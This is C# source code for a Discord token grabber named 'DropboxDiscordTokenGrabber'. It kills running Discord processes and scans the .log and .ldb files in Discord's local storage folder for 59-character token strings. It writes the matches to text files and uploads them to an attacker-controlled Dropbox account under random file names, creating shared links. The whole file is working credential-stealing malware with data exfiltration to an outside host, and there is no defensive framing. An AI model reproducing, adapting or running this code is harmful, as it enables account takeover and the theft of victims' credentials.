using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using Dropbox.Api;
using Dropbox.Api.Files;
using System.Text.RegularExpressions;

namespace DropboxDiscordTokenGrabber
{
    public class Grabbing
    {
        public static void KillDiscord()
        {
            Process[] processes = Process.GetProcessesByName("Discord");
            foreach (var process in processes)
            {
                process.Kill();
            }
        }

        public static string DropboxToken = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR DROPBOX DEVELOPER APP TOKEN HERE. (GIVE THE APP FULL ACCESS TO YOUR DROPBOX!)

        public static void UploadLogFile()
        {
            using (var dbx = new DropboxClient(DropboxToken))
            {
                var files = SearchForFile(); // to get log files
                if (files.Count == 0)
                {
                    Console.WriteLine("Didn't find any log files");
                    return;
                }
                foreach (string token in files)
                {
                    foreach (Match match in Regex.Matches(token, "[^\"]*"))
                    {
                        if (match.Length == 59)
                        {
                            Console.WriteLine($"Token={match.ToString()}");
                            using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt", true))
                            {
                                sw.WriteLine($"Token={match.ToString()}");
                            }
                        }
                    }
                }

                string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt";
                string folder = "";

                // Generate random filename to be able to upload more .log files to Dropbox
                Random rnd = new Random();
                int length = 8;
                var randomstr = "";
                for (var i = 0; i < length; i++)
                {
                    randomstr += ((char)(rnd.Next(1, 26) + 64)).ToString();
                }

                string filename = randomstr + ".log";
                string url = "";

                using (var mem = new MemoryStream(File.ReadAllBytes(uploadfile)))
                {
                    var updated = dbx.Files.UploadAsync(folder + "/" + filename, WriteMode.Overwrite.Instance, body: mem);
                    updated.Wait();
                    var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(folder + "/" + filename);
                    tx.Wait();
                    url = tx.Result.Url;
                }

                List<string> SearchForFile()
                {
                    List<string> ldbFiles = new List<string>();
                    string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                    if (!Directory.Exists(discordPath))
                    {
                        Console.WriteLine("Discord path not found");
                        return ldbFiles;
                    }

                    foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
                    {
                        string rawText = File.ReadAllText(file);
                        if (rawText.Contains("oken"))
                        {
                            Console.WriteLine($"{Path.GetFileName(file)} added");
                            ldbFiles.Add(rawText);
                        }
                    }
                    return ldbFiles;
                }
            }
        }

        public static void UploadldbFile()
        {
            using (var dbx = new DropboxClient(DropboxToken))
            {
                var files = SearchForFile(); // to get ldb files
                if (files.Count == 0)
                {
                    Console.WriteLine("Didn't find any ldb files");
                    return;
                }
                foreach (string token in files)
                {
                    foreach (Match match in Regex.Matches(token, "[^\"]*"))
                    {
                        if (match.Length == 59)
                        {
                            Console.WriteLine($"Token={match.ToString()}");
                            using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt", true))
                            {
                                sw.WriteLine($"Token={match.ToString()}");
                            }
                        }
                    }
                }

                string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt";
                string folder = "";

                // Generate random filename to be able to upload more .log files to Dropbox
                Random rnd = new Random();
                int length = 8;
                var randomstr = "";
                for (var i = 0; i < length; i++)
                {
                    randomstr += ((char)(rnd.Next(1, 26) + 64)).ToString();
                }

                string filename = randomstr + ".log";
                string url = "";

                using (var mem = new MemoryStream(File.ReadAllBytes(uploadfile)))
                {
                    var updated = dbx.Files.UploadAsync(folder + "/" + filename, WriteMode.Overwrite.Instance, body: mem);
                    updated.Wait();
                    var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(folder + "/" + filename);
                    tx.Wait();
                    url = tx.Result.Url;
                }

                List<string> SearchForFile()
                {
                    List<string> ldbFiles = new List<string>();
                    string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                    if (!Directory.Exists(discordPath))
                    {
                        Console.WriteLine("Discord path not found");
                        return ldbFiles;
                    }

                    foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
                    {
                        string rawText = File.ReadAllText(file);
                        if (rawText.Contains("oken"))
                        {
                            Console.WriteLine($"{Path.GetFileName(file)} added");
                            ldbFiles.Add(rawText);
                        }
                    }
                    return ldbFiles;
                }
            }
        }
    }
}
